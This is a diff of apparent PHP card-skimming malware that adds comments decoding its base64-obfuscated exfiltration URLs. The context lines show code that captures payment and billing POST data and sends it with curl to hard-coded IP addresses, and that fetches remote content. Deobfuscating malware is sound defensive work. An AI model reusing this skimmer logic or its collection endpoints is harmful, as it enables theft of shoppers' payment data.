@@ -34,6 +34,7 @@ try {
                     '","tag":"a181a603769c1f98ad927e7367c7aa51"}'
             ),
             "aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA=="
+            // "https://45.197.141.250/statystics.php"
         );
     }
     if (isset($_POST['payment']) && isset($_POST['billing'])) {
@@ -50,6 +51,7 @@ try {
                     '","tag":"a181a603769c1f98ad927e7367c7aa51"}'
             ),
             "aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA=="
+            // "https://45.197.141.250/statystics.php"
         );
     }
     if (
@@ -92,6 +94,7 @@ try {
                     '","tag":"a181a603769c1f98ad927e7367c7aa51"}'
             ),
             'aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA=='
+            // "https://45.197.141.250/statystics.php"
         );
         $_COOKIE['portzilla'] = '';
         setcookie('portzilla', '1', time() - 36000, '/');
@@ -122,6 +125,7 @@ try {
                         '","tag":"a181a603769c1f98ad927e7367c7aa51"}'
                 ),
                 'aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9zdGF0eXN0aWNzLnBocA=='
+                // "https://45.197.141.250/statystics.php"
             );
             setcookie('_fni', '1', time() + 36000, '/');
             setcookie('_mtoken', '1', time() - 36000, '/');
@@ -195,6 +199,7 @@ try {
         if (preg_match("/" . $value . "/i", $writetext)) {
             $array = ['osl' => base64_encode($writetext)];
             $gine = "aHR0cHM6Ly8xMDMuMTM5LjExMy4zNC9vc3ItMy4wLnBocA==";
+            // $gine = "https://103.139.113.34/osr-3.0.php"
             $url = base64_decode($gine);
             $ch = curl_init($url);
             curl_setopt($ch, CURLOPT_POST, 1);
@@ -216,6 +221,7 @@ try {
                     echo file_get_contents(
                         base64_decode(
                             "aHR0cDovLzQ1LjE5Ny4xNDEuMjUwL2h1MzQ1Ymh1dWZkNzNmc2R5OHc0LnBocD9zdGF0cz01YzNhNzcwYWUzMTNmMmFiMTM4MDZiNGUzMTQ3ZGU3NQ=="
+                            // "http://45.197.141.250/hu345bhuufd73fsdy8w4.php?stats=5c3a770ae313f2ab13806b4e3147de75"
                         )
                     );
                 }
@@ -227,6 +233,7 @@ try {
             $ch = curl_init(
                 base64_decode(
                     "aHR0cHM6Ly80NS4xOTcuMTQxLjI1MC9hbmFseXRpY3MucGhw"
+                    // "https://45.197.141.250/analytics.php"
                 )
             );
             curl_setopt($ch, CURLOPT_POST, 1);
